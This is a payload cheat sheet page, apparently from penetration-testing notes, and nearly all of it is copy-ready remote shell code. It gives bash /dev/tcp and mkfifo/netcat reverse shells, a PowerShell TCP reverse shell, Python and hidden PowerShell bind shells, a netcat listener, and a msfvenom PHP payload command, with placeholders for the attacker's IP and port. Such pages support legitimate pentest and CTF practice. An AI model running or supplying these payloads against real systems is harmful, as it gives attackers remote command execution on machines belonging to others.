---
layout: default
title: Payloads
permalink: /payloads/
---

# Reverse Shell

First set up a listener on your attacking host:

```
nc -lvnp 1234
```

Firt to get your ip, you can use the `ip` utility:
```
ip addr
```
[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) contains reverse shell scripts for various languages and web frameworks, and we can utilize any of them to receive a reverse shell as well.

To create a reverse shell payload I can recommend this [online reverse shell generator](https://www.revshells.com/), but here are some example.

## Bash Payloads

```
echo "bash -c 'bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1'" > rev.sh
```
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $attacker_ip $attacker_port >/tmp/f" > rev.sh
```

## PowerShell Payload

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

# Bind Shell

Unlike a Reverse Shell that connects to us, we will have to connect to it on the targets' listening port.

## Bash Payload

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

## Python Payload
```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

## PowerShell Payload
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

## PHP
One reliable reverse shell for PHP is the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell.

# Msfvenom

### PHP
```
 msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
Similarly, we can generate reverse shell scripts for several languages. We can use many reverse shell payloads with the -p flag and specify the output language with the -f flag.

# Establish connection

```
nc 10.10.10.1 1234
```
